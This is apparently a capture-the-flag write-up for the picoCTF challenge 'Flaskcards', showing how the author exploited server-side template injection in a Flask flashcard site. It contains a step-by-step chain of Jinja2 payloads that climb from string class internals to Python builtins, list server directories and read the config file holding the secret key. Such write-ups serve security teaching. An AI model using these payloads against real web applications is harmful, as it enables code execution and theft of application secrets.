# Flaskcards
Web Exploitation, 350 points
## Description:
> We found this fishy **website** for flashcards that we think may be sending secrets. Could you take a look? 
## Solution:
The website was a simple "Flashcard" system, allowing the user to create question-answer pairs and then view them:
Card creation:
![Flask](images/Flaskcards_1.png)
Listing the cards:
![Flask](images/Flaskcards_2.png)
Clicking the "Admin" link led to a page stating that "You Are Not An Admin!".
The name of the challenge hints that it is related to Flask - a micro web framework written in Python. One of the known attacks related to Flask is called [template injection](https://nvisium.com/blog/2015/12/07/injecting-flask.html): We input python code encapsulated in double curly brackets and it gets executed by the template manager.
We start with a small proof of concept:
```
{{''.__class__}}
```
The result is:
```
```
From there, we start building our way up:
```
Input:
{{''.__class__.mro()}}
Output:
[, ]
--
Input:
{{''.__class__.mro()[1].__subclasses__()}}
Output:
[, , [...], , , , , ] 
--
Input:
{{''.__class__.mro()[1].__subclasses__()[703]}}
Output:
--
Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__}}
Output:
{'None': None, 'BufferError': , 'True': True, 'SyntaxWarning': , 'UnicodeEncodeError': , 'max': , 'ConnectionAbortedError': , 'ImportError': , 'Warning': , 'FutureWarning': , '__import__': , 'hex': , 'NotImplemented': NotImplemented, 'open': , 'ConnectionRefusedError': , 'compile': , 'bytes': , 'ConnectionResetError': , 'OSError': , 'copyright': Copyright (c) 2001-2016 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'IndentationError': , 'ZeroDivisionError': , 'delattr': , 'property': , 'SystemExit': , 'ValueError': , 'ConnectionError': , 'UnicodeError': , 'Ellipsis': Ellipsis, 'setattr': , 'UnicodeTranslateError': , 'sorted': , 'round': , 'eval': , 'UnboundLocalError': , '__name__': 'builtins', 'UserWarning': , 'vars': , 'list': , 'IOError': , 'map': , 'complex': , 'zip': , 'RuntimeError': , 'sum': , 'IsADirectoryError': , 'hash': , '__debug__': True, 'False': False, 'int': , 'min': , 'next': , 'slice': , '__spec__': ModuleSpec(name='builtins', loader=), 'ArithmeticError': , 'BlockingIOError': , 'ProcessLookupError': , 'IndexError': , 'bin': , 'bytearray': , 'FileExistsError': , 'staticmethod': , 'NameError': , 'BaseException': , 'frozenset': , 'divmod': , 'set': , 'DeprecationWarning': , 'KeyboardInterrupt': , 'UnicodeDecodeError': , 'reversed': , 'enumerate': , 'EOFError': , 'SystemError': , 'any': , 'exec': , 'chr': , 'BytesWarning': , '__build_class__': , '__package__': '', 'ascii': , 'StopIteration': , 'iter': , 'FileNotFoundError': , 'getattr': , 'ImportWarning': , 'GeneratorExit': , 'isinstance': , 'EnvironmentError': , 'license': Type license() to see the full license text, 'BrokenPipeError': , 'tuple': , '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 'issubclass': , 'format': , 'StopAsyncIteration': , 'float': , 'NotImplementedError': , 'ord': , 'dict': , 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'NotADirectoryError': , 'AttributeError': , 'pow': , 'TabError': , 'FloatingPointError': , 'ReferenceError': , 'Exception': , 'RecursionError': , 'InterruptedError': , 'PermissionError': , 'abs': , 'dir': , 'bool': , 'ChildProcessError': , 'range': , 'str': , 'callable': , 'OverflowError': , 'oct': , 'help': Type help() for interactive help, or help(object) for help about object., 'memoryview': , 'SyntaxError': , 'super': , 'object': , 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'print': , 'ResourceWarning': , 'LookupError': , 'TimeoutError': , 'filter': , 'KeyError': , 'UnicodeWarning': , 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'AssertionError': , 'MemoryError': , 'PendingDeprecationWarning': , 'RuntimeWarning': , 'input': , 'len': , 'id': , 'type': , 'globals': , 'classmethod': , 'all': , '__loader__': , 'locals': , 'repr': , 'hasattr': , 'TypeError': } 
```
Now we can call builtins such as `open` and `__import__`:
```
Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__.__import__('os').listdir('.')}}
Output:
['app', 'xinet_startup.sh', 'server.py']
Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__.__import__('os').listdir('app')}}
Output:
['helpers.py', 'config.py', '__init__.py', 'templates', 'routes.py', 'models.py']
Input:
{{''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[703]()._module.__builtins__.__import__('os').path.join('app','config.py')).read()}}
Output:
import os basedir = os.path.abspath(os.path.dirname(__file__)) class Config(object): SECRET_KEY = 'picoCTF{secret_keys_to_the_kingdom_2a7bf92c}' #SQLALCHEMY_DATABASE_URI = os.environ.get('DATABSE_URL') or 'sqlite:///'+os.path.join(basedir,'app.db') SQLALCHEMY_DATABASE_URI = "sqlite://" SQLALCHEMY_TRACK_MODIFICATIONS = False 
```
The flag: picoCTF{secret_keys_to_the_kingdom_2a7bf92c}